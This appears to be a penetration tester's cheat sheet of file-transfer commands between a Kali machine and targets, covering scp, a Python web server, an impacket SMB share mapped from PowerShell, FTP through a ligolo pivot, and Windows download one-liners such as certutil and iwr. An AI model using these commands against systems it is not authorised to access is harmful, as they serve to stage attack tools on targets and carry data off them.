---
sticker: emoji//1f4c1
---
##### SSH
```
scp file user@host:/path/to/file                        # copying a file to the remote system using scp command

scp user@host:/path/to/file /local/path/to/file         # copying a file from the remote system using scp command

#windows example
scp ariah@192.168.169.99:c:/ftp/Infrastructure.pdf /home/kali/Infrastructure.pdf

scp file1 file2 user@host:/path/to/directory              # copying multiple files using scp command

scp -r /path/to/directory user@host:/path/to/directory  # Copying an entire directory with scp command
```
##### Python
```
python3 -m http.server <port>
```
##### SMB
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali . -smb2support -username kali -pass kali
$pass = ConvertTo-SecureString 'kali' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\<ip>\kali
cd kali:
copy <file_path> .
```

##### FTP

```
setup listener on ligolo to do 21:21
run ftp python server on kali

on windows
ftp
open <target>
put <file>
```
##### Windows
```
wget http://<ip>:<port>/<file>

certutil -urlcache -split -f http://<ip>:<port>/<file> <output_path>

iwr -uri http://<ip>:<port>/<file> -Outfile <output_path>
```
##### Win-RM
```
download <file_path> <host_path>
```
